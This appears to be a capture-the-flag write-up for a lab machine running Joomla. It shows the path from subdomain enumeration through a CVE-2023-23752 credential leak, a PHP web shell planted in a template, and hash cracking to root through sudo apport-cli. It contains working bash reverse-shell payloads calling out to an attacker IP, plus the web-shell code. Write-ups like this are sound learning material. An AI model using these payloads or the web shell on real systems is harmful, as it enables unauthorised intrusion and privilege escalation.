#linux #easy #joomla #cve

# nmap 
```shell
nmap -sC -sV -oN nmap/dev $IP -T5 --min-rate=1000 -p- -sT
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 04:35 CST
Warning: 10.129.229.146 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.229.146
Host is up (0.24s latency).
Not shown: 65065 closed tcp ports (conn-refused), 468 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# scanned the subdomain, found dev.devvortex.htb

```shell
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fc 302


dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 316ms]

```




# The site uses joomla, found it through the /administrator directory

```shell
gobuster dir -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.devvortex.htb

/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]

```

# Used droopescan to enumerate the site, found the version
```shell
droopescan scan joomla -u http://dev.devvortex.htb --enumerate a
```
# Found possible exploit https://www.exploit-db.com/exploits/51334 
[2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752) 


# After running the exploit, it collects credentials in the site
```shell
python3 CVE-2023-23752.py -u http://dev.devvortex.htb
[+] Username: lewis
[+] Username: logan

[+] Password: P4ntherg0t1n5r3c0n##

```

# lewis:P4ntherg0t1n5r3c0n## works

# Used the technique in the github repo to gain reverse shell, uploaded the zip file then I used this url to execute commands

https://github.com/p0dalirius/Joomla-webshell-plugin?tab=readme-ov-file

http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id



# Modified cassiopeia template error.php, added an "if" isset condition to not messed up the normal function of the php file 


```php
if (isset($_REQUEST['cmd'])){
  system($_REQUEST['cmd'])
  
}
```

# triggered a POST request /templates/cassiopeia/error.php and used this payload

```shell
cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.84/4444+0>%261'
```


# used lewis credentials in the mysql server 
found logan password
```shell
 logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

john --wordlist=/usr/share/wordlists/rockyou.txt creds.txt 

logan:tequieromucho
```


# logan has sudo privilege
```shell

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```


# executed the command as ROOT, the command opens a terminal where it execute commands as ROOT using the ! syntax

```shell
sudo apport-cli -f

!bash -i >& /dev/tcp/10.10.14.84/4445 0>&1
```


reference: https://github.com/diego-tella/CVE-2023-1326-PoC